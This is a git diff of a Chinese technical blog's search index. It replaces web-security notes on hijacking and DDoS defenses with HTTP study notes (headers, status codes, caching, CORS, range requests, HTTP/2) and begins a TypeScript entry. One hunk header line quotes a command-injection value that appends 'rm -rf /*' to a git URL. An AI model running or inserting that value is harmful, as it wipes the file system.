-<h5 id="6、请求劫持"><a href="#6、请求劫持" class="headerlink" title="6、请求劫持"></a>6、请求劫持</h5><ul>
-<li><p>DNS劫持</p>
-<blockquote>
-<p>顾名思义， DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip</p>
-</blockquote>
+<h5 id="HTTP协议特点"><a href="#HTTP协议特点" class="headerlink" title="HTTP协议特点"></a>HTTP协议特点</h5><ul>
+<li><p>支持客户/服务器模式</p>
+<ul>
+<li>客户/服务器模式工作的方式是由客户端向服务器发起请求，服务器端响应请求，并进行相应服务</li>
+</ul>
 </li>
-<li><p>HTTP劫持 </p>
-<blockquote>
-<p>运营商劫持，此时大概只能升级HTTPS了</p>
-</blockquote>
-<p>  防御手段：    </p>
-<pre><code>  使用https安全协议</code></pre>
+<li><p>简单快速</p>
+<ul>
+<li>客户向服务器请求服务时，只需传送请求方法和路径</li>
+<li>请求方法常用的有<code>GET</code>、<code>HEAD</code>、<code>POST</code>。每种方法规定了客户与服务器联系的类型不同</li>
+<li>由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快</li>
+</ul>
+</li>
+<li><p>灵活</p>
+<ul>
+<li>HTTP允许传输任意类型的数据对象</li>
+<li>正在传输的类型由<code>Content-Type</code>加以标记</li>
+</ul>
+</li>
+<li><p>无连接</p>
+<ul>
+<li>无连接的含义是限制每次连接只处理一个请求</li>
+<li>服务器处理完客户的请求，并接收到客户的应答后，即断开连接</li>
+<li>采用这种方式可以节省传输时间</li>
+</ul>
+</li>
+<li><p>无状态</p>
+<ul>
+<li>HTTP协议是无状态协议</li>
+<li>无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则必须重传，这样可能导致每次连接传送的数据量大</li>
+<li>在服务器不需要先前信息时，它的应答就较快</li>
+</ul>
 </li>
 </ul>
-<h5 id="7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service"><a href="#7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service" class="headerlink" title="7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)"></a>7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)</h5><p>DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。</p>
-<pre><code>其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承
-受量，导致宕机。
-
-防御手段：
-    1、备份网站
-    备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公
-    告，告诉用户，网站出了问题，正在全力抢修。
-    2、HTTP 请求的拦截
-    3、硬件 服务器 防火墙
-    - 带宽扩容 + CDN
-    提高犯罪成本</code></pre>
+<h5 id="URL和URI"><a href="#URL和URI" class="headerlink" title="URL和URI"></a>URL和URI</h5><ul>
+<li>URI：一个紧凑的字符串用来标示抽象或物理资源</li>
+<li>一个URI可以进一步被分为定位符、名字或两者都是</li>
+<li>URL是URI的子集，除了确定一个资源，还提供了一种定位该资源的主要访问机制</li>
+<li>URI可以分为URL,URN或同时具备locators和names特性的一个东西</li>
+<li>URN作用就好像一个人的名字，URL就像一个人的地址，URN确定了东西的身份，URL提供了找到它的方式</li>
+<li>URL是URI的一种，但不是所有的URI都是URL</li>
+<li>URI和URL最大的差别是“访问机制”</li>
+<li>URN是唯一标识的一部分，是身份信息</li>
+</ul>
+<h5 id="HTTP报文结构"><a href="#HTTP报文结构" class="headerlink" title="HTTP报文结构"></a>HTTP报文结构</h5><ul>
+<li><strong>请求报文：</strong></li>
+</ul>
+<p><img data-src="/images/HTTP/http_request.png" alt="http_request"></p>
+<ul>
+<li><strong>响应报文：</strong></li>
+</ul>
+<p><img data-src="/images/HTTP/http_response.png" alt="http_response"></p>
+<ul>
+<li><p><strong>HTTP报文头：</strong></p>
+<ul>
+<li><p>通用报文头</p>
+<table>
+<thead>
+<tr>
+<th>首部字段名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Cache-Control</td>
+<td>控制缓存的行为</td>
+</tr>
+<tr>
+<td>Connection</td>
+<td>逐跳首部、连接的管理</td>
+</tr>
+<tr>
+<td>Date</td>
+<td>创建报文的日期时间</td>
+</tr>
+<tr>
+<td>Pragma</td>
+<td>报文指令</td>
+</tr>
+<tr>
+<td>Trailer</td>
+<td>报文末端的首部一览</td>
+</tr>
+<tr>
+<td>Transfer-Encoding</td>
+<td>指定报文主体的传输编码方式</td>
+</tr>
+<tr>
+<td>Upgrade</td>
+<td>升级为其他协议</td>
+</tr>
+<tr>
+<td>Via</td>
+<td>代理服务器的相关信息</td>
+</tr>
+<tr>
+<td>Warning</td>
+<td>错误通知</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>请求报文头</p>
+<table>
+<thead>
+<tr>
+<th>首部字段名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Accept</td>
+<td>用户代理可处理的媒体类型</td>
+</tr>
+<tr>
+<td>Accept-Charset</td>
+<td>优先的字符集</td>
+</tr>
+<tr>
+<td>Accept-Encoding</td>
+<td>优先的内容编码</td>
+</tr>
+<tr>
+<td>Accept-Language</td>
+<td>优先的语言（自然语言）</td>
+</tr>
+<tr>
+<td>Authorization</td>
+<td>Web认证信息</td>
+</tr>
+<tr>
+<td>Expect</td>
+<td>期待服务器的特定行为</td>
+</tr>
+<tr>
+<td>From</td>
+<td>用户的电子邮箱地址</td>
+</tr>
+<tr>
+<td>Host</td>
+<td>请求资源所在服务器</td>
+</tr>
+<tr>
+<td>If-Match</td>
+<td>比较实体标记（ETag）</td>
+</tr>
+<tr>
+<td>If-Modified-Since</td>
+<td>比较资源的更新时间</td>
+</tr>
+<tr>
+<td>If-None-Match</td>
+<td>比较实体标记（与If-Match相反）</td>
+</tr>
+<tr>
+<td>If-Range</td>
+<td>资源未更新时发送试题Byte的范围请求</td>
+</tr>
+<tr>
+<td>If-Unmodified-Since</td>
+<td>比较资源的更新时间（与If-Modified-Since相反）</td>
+</tr>
+<tr>
+<td>Max-Forwards</td>
+<td>最大传输逐跳数</td>
+</tr>
+<tr>
+<td>Proxy-Authorization</td>
+<td>代理服务器要求客户端的认证信息</td>
+</tr>
+<tr>
+<td>Range</td>
+<td>实体的字节范围请求</td>
+</tr>
+<tr>
+<td>Referer</td>
+<td>对请求中URI的院士获取方</td>
+</tr>
+<tr>
+<td>TE</td>
+<td>传输编码的优先级</td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>HTTP客户端程序的信息</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="HTTP长连接与短连接"><a href="#HTTP长连接与短连接" class="headerlink" title="HTTP长连接与短连接"></a>HTTP长连接与短连接</h5><ul>
+<li>HTTP协议是基于请求/响应模式的，因此只要服务端给了响应，本次HTTP请求就结束了</li>
+<li>HTTP的长连接和短连接本质上是TCP长连接和短连接</li>
+<li>HTTP/1.0中，默认使用的是短连接，也就是说，浏览器和服务器每进行一次HTTP操作，就建立一次连接，结束就中断</li>
+<li>HTTP/1.1起，默认使用长连接，用以保持连接特性</li>
+<li>短连接：建立连接-数据传输-关闭连接（重复这些步骤）</li>
+<li>长连接：建立连接-数据传输…（保持连接）…数据传输-关闭连接</li>
+</ul>
+<h5 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h5><ul>
+<li>GET：用来请求访问已被URI识别的资源，指定的资源经服务器端解析后返回响应内容，GET方法也可以用来提交表单和其他数据，通过地址传参方式</li>
+<li>POST：一般用来传输实体的主体，主要目的不是获取响应主体的内容</li>
+<li>PUT：从客户端向服务器传送的数据取代指定的文档的内容，该方法与POST方法最大的不同是：PUT是幂等的，而POST是不幂等的，因此，更多时候将PUT方法用作传输资源</li>
+<li>HEAD：类似GET请求，只不过返回的响应中没有具体的内容，用于获取报头</li>
+<li>DELETE：请求服务器删除指定的资源</li>
+<li>OPTIONS：预检请求，用来查询针对请求URI指定的资源支持的方法</li>
+<li>TRACE：回显服务器收到的请求，主要用于测试或诊断</li>
+<li>CONNECT：开启一个客户端与所请求资源之间的双向沟通的通道，它可以用来创建隧道</li>
+</ul>
+<h5 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h5><ul>
+<li><strong>1xx：</strong>请求已接收到，需要进一步处理才能完成，HTTP1.0不支持<ul>
+<li><strong>100 Continue：</strong>上传大文件前使用。<ul>
+<li>由客户端发起请求中携带Expect：100-continue头部触发。</li>
+</ul>
+</li>
+<li><strong>101 Switch Protocols：</strong>协议升级使用。<ul>
+<li>由客户端发起请求中携带Upgrade头部触发，如升级websocket或者http/2.0。</li>
+</ul>
+</li>
+<li><strong>102 Processing：</strong>WebDAV请求可能包含许多设计文件操作的自请求，需要很长时间才能完成请求。该代码表示服务器已经收到并正在处理请求，但无响应可用。这样可以防止客户端超时，并假设请求丢失。</li>
+</ul>
+</li>
+<li><strong>2xx：</strong>成功处理请求’<ul>
+<li><strong>200  OK：</strong>成功返回响应。</li>
+<li><strong>201 Created：</strong>有新资源在服务器端被成功创建。</li>
+<li><strong>202 Accepted：</strong>服务器接收并开始处理请求，但请求未处理完成。这样一个模糊的概念是有意如此设计的，可以覆盖更多的场景。例如异步、需要长时间处理的任务。</li>
+<li><strong>203 Non-Authoritative Information：</strong>当代理服务器修改了origin server的原始响应包体时（例如更换了HTML中的元素值），代理服务器可以通过修改200为203的方式告知客户端这一个事实，方便客户端为这一行为做出相应的处理。203响应可以被缓存。</li>
+<li><strong>204 No Content：</strong>成功执行了请求但是不携带响应包体， 并暗示客户端无需更新当前的页面视图。</li>
+<li><strong>205 Reset Content：</strong>成功执行了请求且不携带响应包体，同时指明客户端需要更新当前页面视图。</li>
+<li><strong>206 Partial Content：</strong>使用range协议时返回部分响应内容时的响应码。</li>
+<li><strong>207 Multi-Status：</strong>在WEBDAV协议中以XML返回多个资源的状态。</li>
+<li><strong>208 Already Reported：</strong>为避免相同集合下资源在207响应码下重复上报，使用208可以使用父集合的响应码。</li>
+</ul>
+</li>
+<li><strong>3xx：</strong>重定向使用Location指向的资源或者缓存中的资源。在RFC2068中规定客户端重定向次数不应该超过5次，以防止死循环。<ul>
+<li><strong>300 Multiple Choices：</strong>资源有多种表述，通过300返回给客户端后由其自行选择访问哪一种表述。由于缺乏明确的细节，300很少使用。</li>
+<li><strong>301 Moved Permanently：</strong>资源永久性地重定向到另一个URI中。</li>
+<li><strong>302 Found：</strong>资源临时地重定向到另一个URI中。</li>
+<li><strong>303 See Other：</strong>重定向到其他资源，常用于POST/PUT等方法的响应中。</li>
+<li><strong>304 Not Modified：</strong>当客户端拥有可能过期的缓存时，会携带缓存的标识etag、时间等信息询问服务器缓存是否仍可复用，而304是告诉客户端可以复用缓存。</li>
+<li><strong>307 Temporary Redirect：</strong>类似302，但明确重定向后请求方法必须与原请求方法相同，不得改变。</li>
+<li><strong>308 Permanent Redirect：</strong>类似301，但明确重定向后请求方法必须与原请求方法相同，不得改变。</li>
+</ul>
+</li>
+<li><strong>4xx：</strong>客户端出现错误<ul>
+<li><strong>400 Bad Request：</strong>服务器认为客户端出现了错误，但不能明确判断为哪种错误时使用此错误码。例如HTTP请求格式错误。</li>
+<li><strong>401 Unauthorized：</strong>用户认证信息缺失或者不正确，导致服务器无法处理请求。</li>
+<li><strong>407 Proxy Authentication Required：</strong>对需要经由代理的请求，认证信息未通过代理服务器的验证</li>
+<li><strong>403 Forbidden：</strong>服务器理解请求的含义，但没有权限执行此请求</li>
+<li><strong>404 Not Found：</strong>服务器没有找到对应的资源</li>
+<li><strong>410 Gone：</strong>服务器没有找到对应的资源，且明确地之道该位置永久性找不到该资源</li>
+<li><strong>405 Method Not Allowed：</strong>服务器不支持请求行中的method方法</li>
+<li><strong>406 Not Acceptable：</strong>对客户端指定的资源表述不存在（例如对语言或者编码有要求），服务器返回表述列表供客户端选择</li>
+<li><strong>408 Request Timeout：</strong>服务器接收请求超时</li>
+<li><strong>409 Conflict：</strong>资源冲突，例如上传文件时目标位置已经存在版本更新的资源</li>
+<li><strong>411 Length Required：</strong>如果请求含有包体且未携带Content-Length头部，且不属于Chunk类请求时，返回411</li>
+<li><strong>412 Precondition Failed：</strong>复用缓存时传递的If-Unmodified-Since或If-None-Match头部不被满足</li>
+<li><strong>413 Payload Too Large/Request Entity Too Large：</strong>请求的包体超出服务器能处理的最大长度</li>
+<li><strong>414 URI Too Long：</strong>请求的URI超出服务器能接受的最大长度</li>
+<li><strong>415 Unsupported Media Type：</strong>上传的文件类型不被服务器支持</li>
+<li><strong>416 Range Not Satisfiable：</strong>无法提供Range请求中指定的那段包体</li>
+<li><strong>417 Expectation Failed：</strong>对于Expect请求头部期待的情况无法满足时的响应码</li>
+<li><strong>421 Misdirected Request：</strong>服务器认为这个请求不该发给它，因为它没有能力处理。</li>
+<li><strong>426 Upgrade Required：</strong>服务器拒绝基于当前HTTP协议提供服务，通过Upgrade头部告知客户端必须升级协议才能继续处理。</li>
+<li><strong>428 Precondition Required：</strong>用户请求中缺失了条件类头部，例如If-Match</li>
+<li><strong>429 Too Many Requests：</strong>客户端发送请求的速率过快</li>
+<li><strong>431 Request Header Fields Too Large：</strong>其你去的HEADER头部大小超过限制</li>
+<li><strong>451 Unavailable For Legal Reasons：</strong>由于法律原因资源不可访问</li>
+</ul>
+</li>
+<li><strong>5xx：</strong>服务器端出现错误<ul>
+<li><strong>500 Internal Server Error：</strong>服务器内部错误，且不属于以下错误类型</li>
+<li><strong>501 Not Implemented：</strong>服务器不支持实现请求所需要的功能</li>
+<li><strong>502 Bad Gateway：</strong>代理服务器无法获取到合法响应</li>
+<li><strong>503 Service Unavailable：</strong>服务器资源尚未准备好处理当前请求</li>
+<li><strong>504 Gateway Timeout：</strong>代理服务器无法及时从上游获得响应</li>
+<li><strong>505 HTTP Version Not Supported：</strong>其你去使用的HTTP协议版本不支持</li>
+<li><strong>507 Insufficient Storage：</strong>服务器没有足够的空间处理请求</li>
+<li><strong>508 Loop Detected：</strong>访问资源时检测到循环</li>
+<li><strong>511 Network Authentication Required：</strong>代理服务器发现客户端需要进行身份验证才能获得网络访问权限</li>
+</ul>
+</li>
+</ul>
+<h5 id="HTTP中介之代理"><a href="#HTTP中介之代理" class="headerlink" title="HTTP中介之代理"></a>HTTP中介之代理</h5><p>代理既是客户端，也是服务端</p>
+<p>对于Web客户端来说，代理扮演的是服务器的角色，接受Request，返回Response</p>
+<p>对于Web服务器来说，代理扮演的是客户端的角色，发送Request，接受Response</p>
+<p>典型的代理服务器例如Fiddler，WireShark等</p>
+<p><strong>代理常见用处：</strong></p>
+<ul>
+<li>抓包</li>
+<li>科学上网</li>
+<li>匿名访问 (中间代理服务器可以隐藏原始ip等信息)</li>
+<li>过滤器</li>
+</ul>
+<h5 id="HTTP中介之网关"><a href="#HTTP中介之网关" class="headerlink" title="HTTP中介之网关"></a>HTTP中介之网关</h5><p>网关是一种协议转换器，连接的是使用两种不同协议的端点</p>
+<ul>
+<li>（HTTP/）服务器端网关：通过HTTP协议与客户端对话，通过其他协议与服务器通信。</li>
+<li>（/HTTP）客户端网关：通过其他协议与客户端对话，通过HTTP协议与服务器通信。</li>
+</ul>
+<p><strong>常见的网关类型：</strong></p>
+<ul>
+<li>（HTTP/*）服务器端Web网关</li>
+<li>（HTTP/HTTPS）服务器端安全网关</li>
+<li>（HTTPS/HTTP）客户端安全加速器网关</li>
+<li>资源网关</li>
+</ul>
+<h5 id="HTTP缓存"><a href="#HTTP缓存" class="headerlink" title="HTTP缓存"></a>HTTP缓存</h5><h6 id="HTTP缓存作用"><a href="#HTTP缓存作用" class="headerlink" title="HTTP缓存作用"></a>HTTP缓存作用</h6><ul>
+<li>减少冗余请求，节省开销</li>
+<li>减少服务器负担，提高网站性能</li>
+<li>加快客户端网页加载的速度</li>
+</ul>
+<h6 id="HTTP缓存头部字段"><a href="#HTTP缓存头部字段" class="headerlink" title="HTTP缓存头部字段"></a>HTTP缓存头部字段</h6><ul>
+<li>Cache-Control    请求/响应头，缓存控制字段<ul>
+<li>no-store：所有内容都不缓存</li>
+<li>no-cache：缓存，但是浏览器使用缓存前，都会请求服务器判断缓存资源是否是最新。</li>
+<li>max-age=x(单位：秒) 请求缓存后的x秒不再发起请求。</li>
+<li>s-maxage=x(单位：秒)代理服务器请求源站缓存后的x秒不再发起请求，只对CDN缓存有效</li>
+<li>public：客户端和代理服务器(CDN)都可缓存</li>
+<li>private：只有客户端可以缓存 </li>
+</ul>
+</li>
+<li>Expires：响应头，代表资源过期时间，由服务器返回提供，是HTTP1.0的属性，在与max-age共存的情况下，优先级相对要低</li>
+<li>Last-Modified：响应头，资源最新修改时间，由服务器告诉浏览器</li>
+<li>if-Modified-Since：请求头，资源最新修改时间，由浏览器告诉服务器，和Last-Modified是一对，它两会进行比对</li>
+<li>Etag：响应头，资源标识，由服务器告诉浏览器</li>
+<li>if-None-Match：请求头，缓存资源标识，由浏览器告诉服务器，和Etag是一对，它两会进行比对</li>
+</ul>
+<h6 id="缓存改进方案"><a href="#缓存改进方案" class="headerlink" title="缓存改进方案"></a>缓存改进方案</h6><ul>
+<li>MD5/Hash缓存：通过不缓存html，为静态文件添加MD5或者Hash标识，解决浏览器无法跳过缓存过期时间主动感知文件变化的问题</li>
+<li>CDN缓存 ：CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络堵塞，提高用户访问响应速度和命中率</li>
+</ul>
+<h6 id="浏览器操作对HTTP缓存的影响"><a href="#浏览器操作对HTTP缓存的影响" class="headerlink" title="浏览器操作对HTTP缓存的影响"></a>浏览器操作对HTTP缓存的影响</h6><table>
+<thead>
+<tr>
+<th>用户操作</th>
+<th>Expires/Cache-Control</th>
+<th>Last-Modified/Etag</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>地址栏回车</td>
+<td>有效</td>
+<td>有效</td>
+</tr>
+<tr>
+<td>页面链接跳转</td>
+<td>有效</td>
+<td>有效</td>
+</tr>
+<tr>
+<td>新开窗口</td>
+<td>有效</td>
+<td>有效</td>
+</tr>
+<tr>
+<td>前进、后退</td>
+<td>有效</td>
+<td>有效</td>
+</tr>
+<tr>
+<td>F5刷新</td>
+<td>无效</td>
+<td>有效</td>
+</tr>
+<tr>
+<td>Ctrl+F5刷新</td>
+<td>无效</td>
+<td>无效</td>
+</tr>
+</tbody></table>
+<h5 id="Cookie使用的限制"><a href="#Cookie使用的限制" class="headerlink" title="Cookie使用的限制"></a>Cookie使用的限制</h5><ul>
+<li>浏览器使用Cookie的要求<ul>
+<li>每条Cookie的长度（包括name、value以及描述的属性总长度）至少要达到4KB</li>
+<li>每个域名下至少支持50个Cookie</li>
+<li>至少要支持3000个Cookie</li>
+</ul>
+</li>
+<li>代理服务器传递Cookie时会有限制</li>
+</ul>
+<h5 id="Cookie存在的问题"><a href="#Cookie存在的问题" class="headerlink" title="Cookie存在的问题"></a>Cookie存在的问题</h5><ul>
+<li>Cookie会被附加到每个HTTP请求中，所以无形中增加了流量</li>
+<li>由于在HTTP请求中的Cookie是明文传输的，所以存在安全性问题</li>
+<li>Cookie的大小不应超过4KB，故对于复杂的存储需求来说是不够用的</li>
+</ul>
+<h5 id="第三方Cookie"><a href="#第三方Cookie" class="headerlink" title="第三方Cookie"></a>第三方Cookie</h5><p>浏览器允许对于不安全域下的资源（例如广告图片）响应中的Set-Cookie保存，并在后续访问该域时自动使用Cookie</p>
+<h5 id="浏览器的同源策略"><a href="#浏览器的同源策略" class="headerlink" title="浏览器的同源策略"></a>浏览器的同源策略</h5><p>限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互</p>
+<ul>
+<li><p>何为同源？协议、主机、端口必须完全相同</p>
+</li>
+<li><p>例如：<a href="http://a.test.com/dir/page.html%E6%A3%80%E6%B5%8B%E4%BB%A5%E4%B8%8B%E6%98%AF%E5%90%A6%E5%90%8C%E6%BA%90">http://a.test.com/dir/page.html检测以下是否同源</a></p>
+<table>
+<thead>
+<tr>
+<th><strong>URL</strong></th>
+<th>结果</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="http://a.test.com/dir2/other.html">http://a.test.com/dir2/other.html</a></td>
+<td>成功</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a href="http://a.test.com/dir/inner/another.html">http://a.test.com/dir/inner/another.html</a></td>
+<td>成功</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a href="https://store.company.com/secure.html">https://store.company.com/secure.html</a></td>
+<td>失败</td>
+<td>不同协议（https和http）</td>
+</tr>
+<tr>
+<td><a href="http://a.test.com:81/dir/etc.html">http://a.test.com:81/dir/etc.html</a></td>
+<td>失败</td>
+<td>不同端口（http默认端口是80)，和81端口不同）</td>
+</tr>
+<tr>
+<td><a href="http://b.test.com/dir/other.html">http://b.test.com/dir/other.html</a></td>
+<td>失败</td>
+<td>不同域名（a和b）</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h5 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h5><p>CORS（Cross-Origin Resource Sharing）可以用来解决跨域问题。</p>
+<p>浏览器会对所有跨域请求进行验证，分为简单请求验证处理和预检请求验证处理</p>
+<h6 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h6><ul>
+<li>GET/HEAD/POST方法之一</li>
+<li>仅能使用CORS安全的头部：<code>Accept</code>、<code>Accept-Language</code>、<code>Content-Language</code>、<code>Content-Type</code></li>
+<li>Content-Type值只能是：<code>text/plain</code>、<code>multipart/form-data</code>、<code>application/x-www-form-urlencoded</code>三者其中之一</li>
+</ul>
+<h6 id="简单请求以外的其他请求"><a href="#简单请求以外的其他请求" class="headerlink" title="简单请求以外的其他请求"></a>简单请求以外的其他请求</h6><ul>
+<li>访问资源前，需要先发起preflight预检请求（方法为OPTIONS）询问何种请求是被允许的</li>
+</ul>
+<h6 id="预检请求头部"><a href="#预检请求头部" class="headerlink" title="预检请求头部"></a>预检请求头部</h6><ul>
+<li><p>Origin</p>
+<ul>
+<li>来自哪个域名</li>
+</ul>
+</li>
+<li><p>Access-Control-Request-Method</p>
+<ul>
+<li>在preflight预检请求（OPTIONS）中，告知服务器接下来的请求会使用哪些方法</li>
+</ul>
+</li>
+<li><p>Access-Control-Request-Headers</p>
+<ul>
+<li>在preflight预检请求（OPTIONS）中，告知服务器接下来的请求会传递哪些头部</li>
+</ul>
+</li>
+</ul>
+<h6 id="预检请求响应"><a href="#预检请求响应" class="headerlink" title="预检请求响应"></a>预检请求响应</h6><ul>
+<li>Access-Control-Allow-Methods<ul>
+<li>在preflight预检请求的响应中，告知客户端后续请求允许使用的方法</li>
+</ul>
+</li>
+<li>Access-Control-Allow-Headers<ul>
+<li>在preflight预检请求的响应中，告知客户端后续请求允许携带的头部</li>
+</ul>
+</li>
+<li>Access-Control-Max-Age<ul>
+<li>在preflight预检请求的响应中，告知客户端该响应的信息可以缓存多久</li>
+</ul>
+</li>
+<li>Access-Control-Expose-Headers<ul>
+<li>告知浏览器哪些响应头部可以供客户端使用，默认情况下只有<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>可供使用</li>
+</ul>
+</li>
+<li>Access-Control-Allow-Origin<ul>
+<li>告知浏览器允许哪些域访问当前资源，<code>*</code>表示允许所有域</li>
+</ul>
+</li>
+<li>Access-Control-Allow-Credentials<ul>
+<li>告知浏览器是否可以将<code>Credentials</code>暴露给客户端使用，<code>Credentials</code>包含<code>cookie</code>、<code>authorization</code>类头部、TLS证书等</li>
+</ul>
+</li>
+</ul>
+<h5 id="内容协商机制"><a href="#内容协商机制" class="headerlink" title="内容协商机制"></a>内容协商机制</h5><p>指客户端和服务端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言，字符集，编码方式等作为判断的基准</p>
+<h6 id="内容协商方式"><a href="#内容协商方式" class="headerlink" title="内容协商方式"></a>内容协商方式</h6><ul>
+<li>客户端驱动：客户端发起请求，服务器发送可选项列表，客户端做出选择后再发送第二次请求</li>
+<li>服务器驱动：服务器检查客户端的请求头部集并决定提供哪个版本的页面</li>
+<li>透明协商</li>
+<li>某个中间设备（通常是缓存代理）代表客户端进行协商</li>
+</ul>
+<h6 id="请求首部集"><a href="#请求首部集" class="headerlink" title="请求首部集"></a>请求首部集</h6><ul>
+<li>Accept：告知服务器发送何种媒体类型</li>
+<li>Accept-Language：告知服务器发送何种语言</li>
+<li>Accept-Charset：告知服务器发送何种字符集</li>
+<li>Accept-Encoding：告知服务器采用何种编码</li>
+</ul>
+<h6 id="响应首部集"><a href="#响应首部集" class="headerlink" title="响应首部集"></a>响应首部集</h6><ul>
+<li>Content-Type：对应请求首部Accept和Accept-Charset</li>
+<li>Content-Language：对应请求首部Accept-Language</li>
+<li>Content-Encoding：对应请求首部Accept-Encoding</li>
+</ul>
+<h5 id="断点续传和多线程下载"><a href="#断点续传和多线程下载" class="headerlink" title="断点续传和多线程下载"></a>断点续传和多线程下载</h5><p>HTTP是通过在Header里两个参数实现的，客户端发请求时对应的是<code>Range</code>，服务端响应时对应的是<code>Content-Range</code></p>
+<ul>
+<li><p>Range</p>
+<p>Range：bytes=0-499</p>
+<p>Range：bytes=500-999</p>
+<p>Range：bytes=-500</p>
+<p>Range：bytes=500-</p>
+<p>Range：bytes=500-600,601-999</p>
+</li>
+<li><p>Content-Range</p>
+<p>在响应完成后，返回的响应头内容也不同：</p>
+<ul>
+<li>HTTP/1.1 200 OK (不使用断点续传方式)</li>
+<li>HTTP/1.1 206 Partial Content (使用断点续传方式)</li>
+</ul>
+</li>
+</ul>
+<h6 id="断点续传过程"><a href="#断点续传过程" class="headerlink" title="断点续传过程"></a>断点续传过程</h6><ol>
+<li>客户端下载一个1024K文件，已经下载了其中512K</li>
+<li>网络中断，客户端请求续传，因此需要在HTTP头中申明本次需要续传的片段：<code>Range:bytes=512000-</code>这个头通知服务端从文件的512K位置开始传输文件。</li>
+<li>服务端收到断点续传请求，从文件的512K位置开始传输，并且在HTTP头中增加：<code>Content-Range:bytes 512000-/1024000</code>，并且此时服务端返回的HTTP状态码应该是206，而不是200</li>
+</ol>
+<h5 id="HTTP-1-1遇到的问题"><a href="#HTTP-1-1遇到的问题" class="headerlink" title="HTTP/1.1遇到的问题"></a>HTTP/1.1遇到的问题</h5><ul>
+<li>高延迟带来页面加载速度的降低<ul>
+<li>随着带宽的增加，延迟并没有显著下降</li>
+<li>并发连接有限</li>
+<li>同一连接同时只能在完成一个HTTP事务（请求/响应）才能处理下一个事务</li>
+</ul>
+</li>
+<li>单连接上的串行请求</li>
+<li>无状态导致的高传输量（低网络效率）</li>
+<li>重复传输的体积巨大的HTTP头部</li>
+<li>不支持服务器推送消息</li>
+</ul>
+<h5 id="HTTP2特性"><a href="#HTTP2特性" class="headerlink" title="HTTP2特性"></a>HTTP2特性</h5><ul>
+<li>传输数据量大幅减少<ul>
+<li>以二进制方式传输</li>
+<li>标头压缩</li>
+</ul>
+</li>
+<li>多路复用及相关功能<ul>
+<li>消息优先级</li>
+</ul>
+</li>
+<li>服务端消息推送<ul>
+<li>并行推送</li>
+</ul>
+</li>
+</ul>
 ]]></content>
       <categories>
-        <category>web安全</category>
+        <category>HTTP</category>
       </categories>
       <tags>
-        <tag>安全</tag>
+        <tag>HTTP</tag>
+        <tag>网络</tag>
       </tags>
   </entry>
   <entry>
@@ -1385,6 +1923,302 @@ https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</code></pre>
       <tags>
         <tag>Linux</tag>
         <tag>系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TypeScript笔记整理</title>
+    <url>/20200928/094824.html</url>
+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>Javascript是一门很自由的动态语言，这种风格有好处也有坏处，只是如果所处的项目比较大型的话，就需要一种<strong>类型安全</strong>的机制，而TypeScript就提供了这样的能力。</p>
+<p>TypeScript是Javascript的超集，可以编译成纯Javascript，可以在任何浏览器、计算机、操作系统上面运行。TypeScript支持类型声明、泛型、接口、枚举、装饰器等特性，在编译阶段就能帮我们发现程序中不合理的地方，使程序更健壮，同时也能帮助我们<strong>重塑类型思维</strong>。</p>
+</blockquote>
+<a id="more"></a>
+
+<h5 id="安装使用环境"><a href="#安装使用环境" class="headerlink" title="安装使用环境"></a>安装使用环境</h5><p>全局安装typscript</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install -g typescript</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">yarn <span class="built_in">global</span> add typescript</span><br></pre></td></tr></table></figure>
+
+<p>这样，你就能使用<code>tsc</code>命令来编译<code>.ts</code>后缀的文件，再使用<code>node</code>命令执行</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tsc index.ts	<span class="comment">// 将index.ts编译成index.js</span></span><br><span class="line">node index.js</span><br></pre></td></tr></table></figure>
+
+<p>如果想简单一点，直接编译运行，可以安装<code>ts-node</code>插件</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install -g ts-node</span><br><span class="line"><span class="comment">// or </span></span><br><span class="line">yarn <span class="built_in">global</span> add ts-node</span><br></pre></td></tr></table></figure>
+
+<p>这样，就可以直接使用<code>ts-node</code>命令来执行<code>.ts</code>后缀的文件了</p>
